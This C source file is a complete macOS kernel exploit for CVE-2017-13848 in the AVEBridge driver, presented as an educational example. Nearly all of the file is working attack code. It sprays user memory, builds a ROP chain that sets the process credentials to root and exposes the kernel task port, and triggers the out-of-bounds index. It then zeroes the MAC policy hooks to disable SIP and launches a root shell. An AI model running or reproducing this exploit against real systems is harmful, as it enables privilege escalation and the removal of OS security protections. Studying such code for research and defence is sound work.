//Jeffball - 11/7/18
//
//This program provides an example macOS kernel exploit and illustrates how to
//escalate privileges and disable SIP.
//
//The CVE-2017-13848 vulnerability that is used in this exploit works by causing
//the kernel to use a user-controlled index without first checking to ensure it
//is within the bounds.  As such, we can provide a large enough index to wrap
//around the address space into userland.  In userland, we then setup the
//necessary pointers in order to direct kernel execution through a ROP payload
//which modifies the our privilege level to root, saves a kernel task port, and
//disables SIP.
//
//On a system with SMAP, we could instead use a kernel heap spray with
//OSString items to place our ROP payload and pointers into kernel memory. It
//works reasonably well, but requires more memory.
//
//As I do not have a kernel information leak to use with this vulnerability,
//the exploit obtains the kernel slide via the kas_info syscall.  As this
//syscall is only available to root processes on a SIP disabled system, this
//exploit will not work with an unmodified macOS kernel.
//
//The original POC and discovery of CVE-2017-13848 was by Alex Plaskett, see
//his advisory at: https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-apple-AVEBridge-invalid-read-advisory-2018-01-19.pdf

#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <errno.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

#include "infoleak.h"
#include "memory_helpers.h"
#include "macf.h"
#include "kernel_info.h"

//#define DEBUG_ROP
//#define DEBUG_MPC_OPS

int spawn_shell(void)
{
	char **args;
	char path[4096];

	args = (char*[]){ "/bin/bash", NULL };
	snprintf(path, sizeof(path), "PATH=%s", getenv("PATH"));
	execve(*args, args, (char*[]){ "EUID=0", "UID=0", "LOGNAME=root", path, NULL });
	return 1;
}

static uint64_t rop_buffer_ptr;
static uint64_t big_buffer[0x3000];
static uint64_t dummy_address;
static uint64_t * rop_buffer = &big_buffer[0x1500];
static char * rop_info[0x1500];
static uint64_t remap_address = 0;
static uint64_t num_gadgets = 0;

#define MEMORY_SPRAY_FILENAME "/tmp/spray"
#define MEMORY_SPRAY_ADDR 0x8000000000ULL
#define MEMORY_SPRAY_SIZE (2ULL*1024*1024*1024)
#define ALLOCATION_SIZE   (1024*1024)
#define WRITE_SIZE        (0x1000)

void setup_rop(uint64_t slide)
{
	void * memory = NULL;
	uint64_t i, j;
	int fd;
	uint64_t kernel_task_argument_address;

	//Open a temp file, that will hold our sprayed content
	fd = open(MEMORY_SPRAY_FILENAME, O_RDWR|O_CREAT, 0600);
	if(fd < 0) {
		printf("Couldn't open temp file: errno %d (%s)\n", errno, strerror(errno));
		exit(1);
	}

	//Fill our write buffer with a pointer to a pointer to the rop payload
	for(i = 0; i < WRITE_SIZE / sizeof(uint64_t); i++) {
		big_buffer[i] = (uint64_t)&rop_buffer_ptr;
	}

	//Fill our temp file with the spray
	for(i = 0; i < ALLOCATION_SIZE/WRITE_SIZE; i++) {
		write(fd, big_buffer, WRITE_SIZE);
	}

	//Make a bunch of duplicate mappings of the file to spray without actually allocating anymore memory
	for(i = 0; i < (MEMORY_SPRAY_SIZE/ALLOCATION_SIZE); i++) {
		memory = mmap((void *)(MEMORY_SPRAY_ADDR + (i * ALLOCATION_SIZE)), ALLOCATION_SIZE, PROT_READ, MAP_PRIVATE|MAP_FIXED, fd, 0);
		if(memory == (void *)-1) {
			printf("mmap failed at %llx: errno %d (%s)\n", MEMORY_SPRAY_ADDR + (i * ALLOCATION_SIZE), errno, strerror(errno));
			exit(1);
		}
	}

	//We don't need the file descriptor any more
	close(fd);

	rop_buffer_ptr = (uint64_t)rop_buffer;
	memset(&big_buffer, 0, sizeof(big_buffer));
	memset(&dummy_address, 0, sizeof(dummy_address));

	num_gadgets = 0;

#define ROP(value, comment) do {               \
	rop_buffer[num_gadgets] = (uint64_t)(value); \
	rop_info[num_gadgets] = comment;             \
	num_gadgets++;                               \
} while(0);

	ROP(0x1111111111111111, "initial r14");
	ROP(0x2222222222222222, "initial r15");
	ROP(0x3333333333333333, "initial rbp");

	////////////////////////////////////////////////////////////
	// Become root:
	// posix_cred_get(proc_ucred(current_proc()))->cr_svuid = 0;
	////////////////////////////////////////////////////////////

	//rax = current_proc()
	ROP(slide + CURRENT_PROC, "current_proc");

	//rax = proc_ucred(rax)
	ROP(slide + POP_RCX, "pop rcx; ret");
	ROP(slide + PROC_UCRED, "proc_ucred");
	ROP(slide + MOV_RDI_RAX_POP_RBP_JMP_RCX, "mov rdi, rax; pop rbp; jmp rcx");
	ROP(0x4444444444444444, "dummy rbp");

	//rax = posix_cred_get(rax)
	ROP(slide + POP_RCX, "pop rcx; ret");
	ROP(slide + POSIX_CRED_GET, "posix_cred_get");
	ROP(slide + MOV_RDI_RAX_POP_RBP_JMP_RCX, "mov rdi, rax; pop rbp; jmp rcx");
	ROP(0x5555555555555555, "dummy rbp");

	//rax->cr_svuid = 0
	ROP(slide + MOV_PTR_RAX_0_POP_RBP_RET, "store 0 to rax+8:  mov qword ptr [rax + 8], 0; pop rbp; ret");
	ROP(0x6666666666666666, "dummy rbp");

	////////////////////////////////////////////////////////////
	// The stack pivot gadget gets loaded at index 57, we need
	// to skip some on our stack to avoid colliding with it.
	////////////////////////////////////////////////////////////

	ROP(slide + ADD_RSP_0x160_POP_RBP_RET, "add rsp, 0x160 ; pop rbp ; ret");
	for(j = 0; j < 45; j++) // 0x160 / 8 = 44 popped addresses, and one for RBP
		ROP(0x7777777777777777, "filler");

	////////////////////////////////////////////////////////////
	// Bring the kernel task port to userland
	// using a technique from Siguza's IOHIDeous exploit. More
	// technical details are available here:
	// - https://github.com/Siguza/hsp4#technical-background
	////////////////////////////////////////////////////////////

	// mach_vm_remap(
	//     kernel_map,
	//     &remap_address,
	//     sizeof(task_t),
	//     0,
	//     VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR,
	//     zone_map,
	//     kernel_task,
	//     false,
	//     &dummy,
	//     &dummy,
	//     VM_INHERIT_NONE
	// );

	//Write the kernel task to the stack further down
	ROP(slide + POP_RDI, "pop rdi; ret");
	ROP(slide + KERNEL_TASK, "kernel_task");
	ROP(slide + MOV_RAX_MEM_RDI_POP_RBP_RET, "load rax from rdi:  mov rax, qword ptr [rdi] ; pop rbp ; ret");
	ROP(0x9999999999999999, "dummy rbp");
	ROP(slide + POP_RDI, "pop rdi; ret");
	kernel_task_argument_address = (uint64_t)&rop_buffer[num_gadgets+24];
	ROP(kernel_task_argument_address, "address of the kernel_task argument further down on the stack");
	ROP(slide + MOV_MEM_RDI_RAX_POP_RBP_RET, "store rax to rdi:  mov qword ptr [rdi], rax ; pop rbp ; ret"); // write the kernel task pointer to the stack
	ROP(0xaaaaaaaaaaaaaaaa, "dummy rbp");

	//Put the kernel map into rdi
	ROP(slide + POP_RDI, "pop rdi; ret");
	ROP(slide + KERNEL_MAP, "kernel_map");
	ROP(slide + MOV_RAX_MEM_RDI_POP_RBP_RET, "load rax from rdi:  mov rax, qword ptr [rdi] ; pop rbp ; ret");
	ROP(0xbbbbbbbbbbbbbbbb, "dummy rbp");
	ROP(slide + POP_RCX, "pop rcx; ret");
	ROP(slide + POP_RSI, "pop rsi; ret"); // rcx = next gadget
	ROP(slide + MOV_RDI_RAX_POP_RBP_JMP_RCX, "mov rdi, rax; pop rbp; jmp rcx");
	ROP(0xcccccccccccccccc, "dummy rbp");
	//Set rsi
	ROP(&remap_address, "address of remap_address");
	//Set rdx
	ROP(slide + POP_RDX, "pop rdx; ret");
	ROP(1400, "sizeof(task_t)");
	//Set rcx
	ROP(slide + POP_RCX, "pop rcx; ret");
	ROP(0, "mask");
	//Set r8
	ROP(slide + POP_R8_POP_RBP, "pop r8 ; pop rbp ; ret");
	ROP(0x100001, "VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR");
	ROP(slide + (ZONE_MAP - MOV_R9_RBP_OFFSET), "ZONE_MAP - MOV_R9_RBP_OFFSET");
	ROP(slide + POP_RAX, "pop rax; ret");
	ROP(slide + POP_RAX, "pop rax; ret"); // jumps over the address pushed by "call rax"
	ROP(slide + MOV_R9_MEM_RBP_0x40_CALL_RAX, "mov r9, qword ptr [rbp - 0x40] ; call rax");

	//Call mach_vm_remap
	ROP(slide + MACH_VM_REMAP, "mach_vm_remap");
	ROP(slide + ADD_RSP_0x20_POP_RBP, "add rsp, 0x20 ; pop rbp ; ret"); // return address for mach_vm_remap (skip over stack arguments)
	// Arguments on the stack:
	ROP(0xdddddddddddddddd, "dummy value, kernel_task gets written here");
	ROP(0, "false");
	ROP(&dummy_address, "cur_protection (dummy_address)");
	ROP(&dummy_address, "max_protection (dummy_address)");
	ROP(2, "VM_INHERIT_NONE");

	// mach_vm_wire(&realhost, kernel_map, remap_address, sizeof(task_t), VM_PROT_READ | VM_PROT_WRITE);
	ROP(slide + POP_RDI, "pop rdi; ret"); // load remap_address
	ROP(&remap_address, "address of remap_address");
	ROP(slide + MOV_RAX_MEM_RDI_POP_RBP_RET, "load rax from rdi:  mov rax, qword ptr [rdi] ; pop rbp ; ret"); // read remap_address
	ROP(0x1111111111111111, "dummy rbp");
	ROP(slide + POP_RCX, "pop rcx; ret");
	ROP(slide + POP_RDI, "pop rdi; ret"); // load kernel_map later
	ROP(slide + MOV_RDX_RAX_POP_RBP_JMP_RCX, "mov rdx, rax ; pop rbp ; jmp rcx"); // this gets us remap_address to rdx
	ROP(0x1111111111111111, "dummy rbp");
	ROP(slide + KERNEL_MAP, "kernel_map");
	ROP(slide + MOV_RAX_MEM_RDI_POP_RBP_RET, "load rax from rdi:  mov rax, qword ptr [rdi] ; pop rbp ; ret"); // read kernel map ptr
	ROP(0x2222222222222222, "dummy rbp");
	ROP(slide + POP_RCX, "pop rcx; ret");
	ROP(slide + POP_RDI, "pop rdi; ret"); // load realhost later
	ROP(slide + MOV_RSI_RAX_POP_RBP_JMP_RCX, "mov rsi, rax ; pop rbp ; jmp rcx"); // this gets us kernel_map to rsi
	ROP(0x3333333333333333, "dummy rbp");
	ROP(slide + REALHOST, "realhost");
	ROP(slide + POP_RCX, "pop rcx; ret");
	ROP(1400, "sizeof(task_t)");
	ROP(slide + POP_R8_POP_RBP, "pop r8 ; pop rbp ; ret");
	ROP(0x3, "VM_PROT_READ | VM_PROT_WRITE");
	ROP(0x4444444444444444, "dummy rbp");
	ROP(slide + MACH_VM_WIRE_EXTERNAL, "mach_vm_wire_external");

	// realhost.special[4] = ipc_port_make_send(ipc_port_alloc_special(ipc_space_kernel));

	// rax = ipc_port_alloc_special(*ipc_space_kernel)
	ROP(slide + POP_RDI, "pop rdi; ret");                                                                     // load *ipc_space_kernel to rdi
	ROP(slide + IPC_SPACE_KERNEL, "ipc_space_kernel");
	ROP(slide + MOV_RAX_MEM_RDI_POP_RBP_RET, "load rax from rdi:  mov rax, qword ptr [rdi] ; pop rbp ; ret");
	ROP(0x5555555555555555, "dummy rbp");
	ROP(slide + POP_RCX, "pop rcx; ret");
	ROP(slide + IPC_PORT_ALLOC_SPECIAL, "ipc_port_alloc_special");                                            // rcx = next address
	ROP(slide + MOV_RDI_RAX_POP_RBP_JMP_RCX, "mov rdi, rax; pop rbp; jmp rcx");
	// rax = ipc_port_make_send(ret)
	ROP(0x6666666666666666, "dummy rbp");
	ROP(slide + POP_RCX, "pop rcx; ret");
	ROP(slide + IPC_PORT_MAKE_SEND, "ipc_port_make_send");                                                    // rcx = next address
	ROP(slide + MOV_RDI_RAX_POP_RBP_JMP_RCX, "mov rdi, rax; pop rbp; jmp rcx");
	// realhost.special[4] = rax;
	ROP(0x7777777777777777, "dummy rbp");
	ROP(slide + POP_RDI, "pop rdi; ret");                                                                     // load address of realhost.special[4] to rdi
	ROP(slide + REALHOST + 0x30, "realhost.special[4]");
	ROP(slide + MOV_MEM_RDI_RAX_POP_RBP_RET, "store rax to rdi:  mov qword ptr [rdi], rax ; pop rbp ; ret");  // store to realhost.special[4]
	ROP(0x8888888888888888, "dummy rbp");

	// ipc_kobject_set(realhost.special[4], remap_addr, IKOT_TASK);
	ROP(slide + POP_RDI, "pop rdi; ret");
	ROP(&remap_address, "address of remap_address");
	ROP(slide + MOV_RAX_MEM_RDI_POP_RBP_RET, "load rax from rdi:  mov rax, qword ptr [rdi] ; pop rbp ; ret");
	ROP(0x9999999999999999, "dummy rbp");
	ROP(slide + POP_RCX, "pop rcx; ret");
	ROP(slide + POP_RDI, "pop rdi; ret");               // load address of realhost.special[4] to rdi
	ROP(slide + MOV_RSI_RAX_POP_RBP_JMP_RCX, "mov rsi, rax ; pop rbp ; jmp rcx"); // move rax (remap_addr) to rsi and call rcx
	ROP(0xaaaaaaaaaaaaaaaa, "dummy rbp");
	ROP(slide + REALHOST + 0x30, "realhost.special[4]");
	ROP(slide + MOV_RAX_MEM_RDI_POP_RBP_RET, "load rax from rdi:  mov rax, qword ptr [rdi] ; pop rbp ; ret");
	ROP(0xbbbbbbbbbbbbbbbb, "dummy rbp");
	ROP(slide + POP_RCX, "pop rcx; ret");
	ROP(slide + POP_RDX, "pop rdx; ret");// rcx = next address
	ROP(slide + MOV_RDI_RAX_POP_RBP_JMP_RCX, "mov rdi, rax; pop rbp; jmp rcx");
	ROP(0xcccccccccccccccc, "dummy rbp");
	ROP(2, "IKOT_TASK");
	ROP(slide + IPC_KOBJECT_SET, "ipc_kobject_set");

	//call thread_exception_return to safely return to userland
	ROP(slide + THREAD_EXCEPTION_RETURN, "thread_exception_return");

	//Write the first gadget to the rop chain
	rop_buffer[57] = slide + STACK_PIVOT; //switches RSP to point at rop_buffer[0]
	rop_info[57]   = "stack_pivot";
}

void print_rop(void) {
#ifdef DEBUG_ROP
	for(uint64_t j = 0; j < num_gadgets; j++)
		printf("%03lld: %016llx = %16llx   %s\n", j, (uint64_t)&rop_buffer[j], rop_buffer[j], rop_info[j]);
	sleep(1);
#endif
}

void cleanup(void)
{
	uint64_t i;
	for(i = 0; i < (MEMORY_SPRAY_SIZE/ALLOCATION_SIZE); i++) {
		munmap((void *)(MEMORY_SPRAY_ADDR + (i * ALLOCATION_SIZE)), ALLOCATION_SIZE);
	}
	unlink(MEMORY_SPRAY_FILENAME);
}

static task_t kernel_task = MACH_PORT_NULL;
static int setup_kernel_task = 0;
task_t get_kernel_task_port(void)
{
	kern_return_t ret;
	task_t self;
	host_t realhost;
	mach_port_array_t arr;
	mach_msg_type_number_t num;

	//If we've already set everything up, just return it
	if(setup_kernel_task)
		return kernel_task;

	//otherwise, retrieve it from realhost.special[4]
	self = mach_task_self();
	realhost = mach_host_self();

	ret = host_get_special_port(realhost, HOST_LOCAL_NODE, 4, &kernel_task);
	if(ret != KERN_SUCCESS || !MACH_PORT_VALID(kernel_task))
	{
		printf("Failed to get kernel task port: %s (port = 0x%x)\n", mach_error_string(ret), kernel_task);
		exit(1);
	}

	ret = mach_ports_lookup(kernel_task, &arr, &num);
	if(ret == KERN_SUCCESS)
	{
		for(size_t i = 0; i < num; ++i)
			mach_port_deallocate(self, arr[i]);
	}
	else
	{
		printf("Failure: kernel task port is restricted.\n");
		exit(1);
	}

	return kernel_task;
}

void print_mpc_ops(mac_policy_ops_t * mpc_ops) {
#ifdef DEBUG_MPC_OPS
	printf("mpc_ops->mpo_file_check_change_offset       %016llx\n",  mpc_ops->mpo_file_check_change_offset);
	printf("mpc_ops->mpo_file_check_create              %016llx\n",  mpc_ops->mpo_file_check_create);
	printf("mpc_ops->mpo_file_check_dup                 %016llx\n",  mpc_ops->mpo_file_check_dup);
	printf("mpc_ops->mpo_file_check_fcntl               %016llx\n",  mpc_ops->mpo_file_check_fcntl);
	printf("mpc_ops->mpo_file_check_get_offset          %016llx\n",  mpc_ops->mpo_file_check_get_offset);
	printf("mpc_ops->mpo_file_check_get                 %016llx\n",  mpc_ops->mpo_file_check_get);
	printf("mpc_ops->mpo_file_check_inherit             %016llx\n",  mpc_ops->mpo_file_check_inherit);
	printf("mpc_ops->mpo_file_check_ioctl               %016llx\n",  mpc_ops->mpo_file_check_ioctl);
	printf("mpc_ops->mpo_file_check_lock                %016llx\n",  mpc_ops->mpo_file_check_lock);
	printf("mpc_ops->mpo_file_check_mmap_downgrade      %016llx\n",  mpc_ops->mpo_file_check_mmap_downgrade);
	printf("mpc_ops->mpo_file_check_mmap                %016llx\n",  mpc_ops->mpo_file_check_mmap);
	printf("mpc_ops->mpo_file_check_receive             %016llx\n",  mpc_ops->mpo_file_check_receive);
	printf("mpc_ops->mpo_file_check_set                 %016llx\n",  mpc_ops->mpo_file_check_set);
	printf("mpc_ops->mpo_file_check_library_validation  %016llx\n",  mpc_ops->mpo_file_check_library_validation);

	printf("mpc_ops->mpo_vnode_check_rename             %016llx\n",  mpc_ops->mpo_vnode_check_rename);
	printf("mpc_ops->mpo_vnode_check_getattr            %016llx\n",  mpc_ops->mpo_vnode_check_getattr);
	printf("mpc_ops->mpo_vnode_check_clone              %016llx\n",  mpc_ops->mpo_vnode_check_clone);
	printf("mpc_ops->mpo_vnode_check_access             %016llx\n",  mpc_ops->mpo_vnode_check_access);
	printf("mpc_ops->mpo_vnode_check_chdir              %016llx\n",  mpc_ops->mpo_vnode_check_chdir);
	printf("mpc_ops->mpo_vnode_check_chroot             %016llx\n",  mpc_ops->mpo_vnode_check_chroot);
	printf("mpc_ops->mpo_vnode_check_create             %016llx\n",  mpc_ops->mpo_vnode_check_create);
	printf("mpc_ops->mpo_vnode_check_deleteextattr      %016llx\n",  mpc_ops->mpo_vnode_check_deleteextattr);
	printf("mpc_ops->mpo_vnode_check_exchangedata       %016llx\n",  mpc_ops->mpo_vnode_check_exchangedata);
	printf("mpc_ops->mpo_vnode_check_exec               %016llx\n",  mpc_ops->mpo_vnode_check_exec);
	printf("mpc_ops->mpo_vnode_check_getattrlist        %016llx\n",  mpc_ops->mpo_vnode_check_getattrlist);
	printf("mpc_ops->mpo_vnode_check_getextattr         %016llx\n",  mpc_ops->mpo_vnode_check_getextattr);
	printf("mpc_ops->mpo_vnode_check_ioctl              %016llx\n",  mpc_ops->mpo_vnode_check_ioctl);
	printf("mpc_ops->mpo_vnode_check_kqfilter           %016llx\n",  mpc_ops->mpo_vnode_check_kqfilter);
	printf("mpc_ops->mpo_vnode_check_label_update       %016llx\n",  mpc_ops->mpo_vnode_check_label_update);
	printf("mpc_ops->mpo_vnode_check_link               %016llx\n",  mpc_ops->mpo_vnode_check_link);
	printf("mpc_ops->mpo_vnode_check_listextattr        %016llx\n",  mpc_ops->mpo_vnode_check_listextattr);
	printf("mpc_ops->mpo_vnode_check_lookup             %016llx\n",  mpc_ops->mpo_vnode_check_lookup);
	printf("mpc_ops->mpo_vnode_check_open               %016llx\n",  mpc_ops->mpo_vnode_check_open);
	printf("mpc_ops->mpo_vnode_check_read               %016llx\n",  mpc_ops->mpo_vnode_check_read);
	printf("mpc_ops->mpo_vnode_check_readdir            %016llx\n",  mpc_ops->mpo_vnode_check_readdir);
	printf("mpc_ops->mpo_vnode_check_readlink           %016llx\n",  mpc_ops->mpo_vnode_check_readlink);
	printf("mpc_ops->mpo_vnode_check_rename_from        %016llx\n",  mpc_ops->mpo_vnode_check_rename_from);
	printf("mpc_ops->mpo_vnode_check_rename_to          %016llx\n",  mpc_ops->mpo_vnode_check_rename_to);
	printf("mpc_ops->mpo_vnode_check_revoke             %016llx\n",  mpc_ops->mpo_vnode_check_revoke);
	printf("mpc_ops->mpo_vnode_check_select             %016llx\n",  mpc_ops->mpo_vnode_check_select);
	printf("mpc_ops->mpo_vnode_check_setattrlist        %016llx\n",  mpc_ops->mpo_vnode_check_setattrlist);
	printf("mpc_ops->mpo_vnode_check_setextattr         %016llx\n",  mpc_ops->mpo_vnode_check_setextattr);
	printf("mpc_ops->mpo_vnode_check_setflags           %016llx\n",  mpc_ops->mpo_vnode_check_setflags);
	printf("mpc_ops->mpo_vnode_check_setmode            %016llx\n",  mpc_ops->mpo_vnode_check_setmode);
	printf("mpc_ops->mpo_vnode_check_setowner           %016llx\n",  mpc_ops->mpo_vnode_check_setowner);
	printf("mpc_ops->mpo_vnode_check_setutimes          %016llx\n",  mpc_ops->mpo_vnode_check_setutimes);
	printf("mpc_ops->mpo_vnode_check_stat               %016llx\n",  mpc_ops->mpo_vnode_check_stat);
	printf("mpc_ops->mpo_vnode_check_truncate           %016llx\n",  mpc_ops->mpo_vnode_check_truncate);
	printf("mpc_ops->mpo_vnode_check_unlink             %016llx\n",  mpc_ops->mpo_vnode_check_unlink);
	printf("mpc_ops->mpo_vnode_check_write              %016llx\n",  mpc_ops->mpo_vnode_check_write);
	printf("mpc_ops->mpo_vnode_check_signature          %016llx\n",  mpc_ops->mpo_vnode_check_signature);
	printf("mpc_ops->mpo_vnode_check_uipc_bind          %016llx\n",  mpc_ops->mpo_vnode_check_uipc_bind);
	printf("mpc_ops->mpo_vnode_check_uipc_connect       %016llx\n",  mpc_ops->mpo_vnode_check_uipc_connect);
	printf("mpc_ops->mpo_vnode_check_searchfs           %016llx\n",  mpc_ops->mpo_vnode_check_searchfs);
	printf("mpc_ops->mpo_vnode_check_fsgetpath          %016llx\n",  mpc_ops->mpo_vnode_check_fsgetpath);
	printf("mpc_ops->mpo_vnode_check_setacl             %016llx\n",  mpc_ops->mpo_vnode_check_setacl);

	printf("mpc_ops->mpo_iokit_check_nvram_get          %016llx\n",  mpc_ops->mpo_iokit_check_nvram_get);
	printf("mpc_ops->mpo_iokit_check_nvram_set          %016llx\n",  mpc_ops->mpo_iokit_check_nvram_set);
	printf("mpc_ops->mpo_iokit_check_nvram_delete       %016llx\n",  mpc_ops->mpo_iokit_check_nvram_delete);
#endif
}

int patch_kernel(uint64_t slide)
{
	task_t kt;
	mac_policy_list_t mpl;
	mac_policy_list_entry_t mple;
	mac_policy_conf_t mpc;
	mac_policy_ops_t mpc_ops;
	uint64_t mple_addr;

	//Get the kernel task port
	kt = get_kernel_task_port();

	////////////////////////////////////////////////////////////
	// Disable the SIP checking functions using a technique from
	// Siguza's IOHIDeous exploit. See the original version in
	// the in the IOHIDeous exploit at:
	// - https://github.com/Siguza/IOHIDeous/blob/master/src/hid/main.c#L485
	////////////////////////////////////////////////////////////

	memset(&mpl, 0, sizeof(mpl));
	KREAD(kt, mpl, slide + MAC_POLICY_LIST);

	for(uint32_t i = 0; i < mpl.staticmax; ++i)
	{
		mple_addr = mpl.entries + i * sizeof(uint64_t);
		KREAD(kt, mple, mple_addr);
		if(mple.mpc != 0)
		{
#ifdef DEBUG_MPC_OPS
			printf("Reading MAC policy at 0x%016llx...\n", mple.mpc);
#endif
			KREAD(kt, mpc, mple.mpc);

			// Remove file, vnode, and nvram access hooks
#ifdef DEBUG_MPC_OPS
			printf("Removing hooks from 0x%016llx...\n", mpc.mpc_ops);
#endif
			KREAD(kt, mpc_ops, mpc.mpc_ops);

			print_mpc_ops(&mpc_ops);

			mpc_ops.mpo_file_check_change_offset        = 0;
			mpc_ops.mpo_file_check_create               = 0;
			mpc_ops.mpo_file_check_dup                  = 0;
			mpc_ops.mpo_file_check_fcntl                = 0;
			mpc_ops.mpo_file_check_get_offset           = 0;
			mpc_ops.mpo_file_check_get                  = 0;
			mpc_ops.mpo_file_check_inherit              = 0;
			mpc_ops.mpo_file_check_ioctl                = 0;
			mpc_ops.mpo_file_check_lock                 = 0;
			mpc_ops.mpo_file_check_mmap_downgrade       = 0;
			mpc_ops.mpo_file_check_mmap                 = 0;
			mpc_ops.mpo_file_check_receive              = 0;
			mpc_ops.mpo_file_check_set                  = 0;
			mpc_ops.mpo_file_check_library_validation   = 0;

			mpc_ops.mpo_vnode_check_rename              = 0;
			mpc_ops.mpo_vnode_check_getattr             = 0;
			mpc_ops.mpo_vnode_check_clone               = 0;
			mpc_ops.mpo_vnode_check_access              = 0;
			mpc_ops.mpo_vnode_check_chdir               = 0;
			mpc_ops.mpo_vnode_check_chroot              = 0;
			mpc_ops.mpo_vnode_check_create              = 0;
			mpc_ops.mpo_vnode_check_deleteextattr       = 0;
			mpc_ops.mpo_vnode_check_exchangedata        = 0;
			mpc_ops.mpo_vnode_check_exec                = 0;
			mpc_ops.mpo_vnode_check_getattrlist         = 0;
			mpc_ops.mpo_vnode_check_getextattr          = 0;
			mpc_ops.mpo_vnode_check_ioctl               = 0;
			mpc_ops.mpo_vnode_check_kqfilter            = 0;
			mpc_ops.mpo_vnode_check_label_update        = 0;
			mpc_ops.mpo_vnode_check_link                = 0;
			mpc_ops.mpo_vnode_check_listextattr         = 0;
			mpc_ops.mpo_vnode_check_lookup              = 0;
			mpc_ops.mpo_vnode_check_open                = 0;
			mpc_ops.mpo_vnode_check_read                = 0;
			mpc_ops.mpo_vnode_check_readdir             = 0;
			mpc_ops.mpo_vnode_check_readlink            = 0;
			mpc_ops.mpo_vnode_check_rename_from         = 0;
			mpc_ops.mpo_vnode_check_rename_to           = 0;
			mpc_ops.mpo_vnode_check_revoke              = 0;
			mpc_ops.mpo_vnode_check_select              = 0;
			mpc_ops.mpo_vnode_check_setattrlist         = 0;
			mpc_ops.mpo_vnode_check_setextattr          = 0;
			mpc_ops.mpo_vnode_check_setflags            = 0;
			mpc_ops.mpo_vnode_check_setmode             = 0;
			mpc_ops.mpo_vnode_check_setowner            = 0;
			mpc_ops.mpo_vnode_check_setutimes           = 0;
			mpc_ops.mpo_vnode_check_stat                = 0;
			mpc_ops.mpo_vnode_check_truncate            = 0;
			mpc_ops.mpo_vnode_check_unlink              = 0;
			mpc_ops.mpo_vnode_check_write               = 0;
			mpc_ops.mpo_vnode_check_signature           = 0;
			mpc_ops.mpo_vnode_check_uipc_bind           = 0;
			mpc_ops.mpo_vnode_check_uipc_connect        = 0;
			mpc_ops.mpo_vnode_check_searchfs            = 0;
			mpc_ops.mpo_vnode_check_fsgetpath           = 0;
			mpc_ops.mpo_vnode_check_setacl              = 0;

			mpc_ops.mpo_iokit_check_nvram_get           = 0;
			mpc_ops.mpo_iokit_check_nvram_set           = 0;
			mpc_ops.mpo_iokit_check_nvram_delete        = 0;

			KWRITE(kt, mpc_ops, mpc.mpc_ops);
		}
	}

	return 0;
}

void trigger_vuln(uint64_t index)
{
	kern_return_t err;
	unsigned int selector = 0;
	uint64_t inputScalar[16];
	uint64_t inputScalarCnt = 0;
	uint64_t outputScalar[16];
	uint32_t outputScalarCnt = 0;
	char outputStruct[4096];
	size_t outputStructCnt = 0;
	char inputStruct[] = "";
	size_t inputStructCnt = 0;

	//Get a handle to the service
	io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,IOServiceMatching("com_apple_AVEBridge"));
	if (service == IO_OBJECT_NULL){
		printf("unable to find service\n");
		exit(1);
	}

	//Get a user client to talk to the service
	io_connect_t conn = MACH_PORT_NULL;
	err = IOServiceOpen(service, mach_task_self(), 0, &conn);
	if (err != KERN_SUCCESS){
		printf("unable to get user client connection\n");
		exit(1);
	}

	//Make a connection to the userclient with selector 0.
	selector = 0; //selector select 0 = openUserClient
	err = IOConnectCallMethod(conn,selector,inputScalar,inputScalarCnt,inputStruct,inputStructCnt,outputScalar,&outputScalarCnt,outputStruct,&outputStructCnt);
	if (err != KERN_SUCCESS){
		printf("Unable to get open user client\n");
		exit(1);
	}

	//Trigger the vulnerable query_completion
	selector = 3; //selector 3 = queryCompletion
	inputScalar[0] = index;
	inputScalarCnt = 1;
	outputScalar[0] = 1;
	outputScalarCnt = 1;
	err = IOConnectCallMethod(conn,selector,inputScalar,inputScalarCnt,inputStruct,inputStructCnt,outputScalar,&outputScalarCnt,outputStruct,&outputStructCnt);
}

int main(int argc, char *argv[])
{
	uint64_t slide;

	//Get the kernel slide
	slide = get_kernel_slide();

	//Put our ROP payload in memory
	printf("Spraying memory and setting up ROP gadgets\n");
	setup_rop(slide);
	print_rop();

	if(argc > 1 && !strcmp(argv[1], "-dryrun"))
		exit(1);

	//Trigger the vulnerability
	printf("Triggering vulnerability\n");
	trigger_vuln(0x2000000000ULL); //hardcoded index to point to our allocated memory

	//Cleanup our memory spray
	printf("Cleaning up memory spray\n");
	cleanup();

	//Become root
	printf("Becoming root\n");
	if(seteuid(0) || setuid(0)) {
		printf("seteuid/setuid failed: errno %d (%s)\n", errno, strerror(errno));
		return 1;
	}

	//Patch the kernel to disable SIP
	printf("Disabling SIP\n");
	if(patch_kernel(slide)) {
		printf("patch_kernel failed\n");
		return 1;
	}

	//Launch privileged shell
	printf("Launching root shell\n");
	return spawn_shell();
}
